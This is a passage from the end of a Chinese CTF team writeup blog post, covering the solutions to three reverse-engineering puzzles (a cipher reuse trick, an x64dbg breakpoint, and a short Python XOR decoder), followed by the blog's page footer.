+<h2 id="0x0b-combat_slogan">0x0B combat_slogan</h2>
+<p>将密文作为参数传进加密函数即可<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="1383" height="933" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/01/图片-66.png" alt="" class="wp-image-4906" /> </figure></p>
+<h2 id="0x0c-cute_doge">0x0C cute_doge</h2>
+<figure class="wp-block-image size-full is-resized">
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/01/图片-67.png" alt="" class="wp-image-4907" width="344" height="488" /> </figure></p>
+<p>信了信了</p>
+<p>x64dbg打开QMessageBox下断点，跟几步就看到了flag<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="1390" height="677" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/01/图片-68.png" alt="" class="wp-image-4908" /> </figure></p>
+<h2 id="0x0d-hello_py">0x0D hello_py</h2>
+<pre class="wp-block-code"><code>Happy = &#91;44,100,3,50,106,90,5,102,10,112]
+
+for i in range(10):
+    if(i%2==1):
+        print(chr(Happy&#91;i]^i),end='')
+    else:
+        print(chr(Happy&#91;i]^Happy&#91;i+1]),end='')</code></pre><blockquote>
+</blockquote>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2022-01-08</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/2022-01-08-%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B-writeup/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://hannibal0x.github.io/2022-01-08-%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B-writeup/" data-title="长安“战疫”网络安全卫士守护赛 1ynx战队 Writeup" data-hashtags="CTF"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://hannibal0x.github.io/2022-01-08-%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B-writeup/" data-hashtag="CTF"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://hannibal0x.github.io/2022-01-08-%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B-writeup/" data-title="长安“战疫”网络安全卫士守护赛 1ynx战队 Writeup"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://hannibal0x.github.io/2022-01-08-%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B-writeup/" data-title="长安“战疫”网络安全卫士守护赛 1ynx战队 Writeup"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://hannibal0x.github.io/2022-01-08-%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B-writeup/" data-title="长安“战疫”网络安全卫士守护赛 1ynx战队 Writeup"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/ctf/">CTF</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/2022-01-06-%E7%AB%AF%E7%82%B9%E6%A3%80%E6%B5%8B%E4%B8%8E%E5%93%8D%E5%BA%94%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%88%98%E6%9C%AF%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90/" class="prev" rel="prev" title="端点检测与响应系统的战术溯源分析"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>端点检测与响应系统的战术溯源分析</a>
+            <a href="/2022-01-11-%E6%89%93%E9%9D%B6-evilbox-one/" class="next" rel="next" title="打靶-EVILBOX: ONE">打靶-EVILBOX: ONE<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+<div id="comments"><div id="utterances" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://utteranc.es/">utterances</a>.
+            </noscript></div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.101.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Hannibal0x</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/algoliasearch/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{"utterances":{"darkTheme":"github-dark","issueTerm":"pathname","label":"","lightTheme":"github-light","repo":"Hannibal0x/blog-comment"}},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"algoliaAppID":"LBWAPJR4IC","algoliaIndex":"blog","algoliaSearchKey":"3771060ae26cbca6e13551298e854580","highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
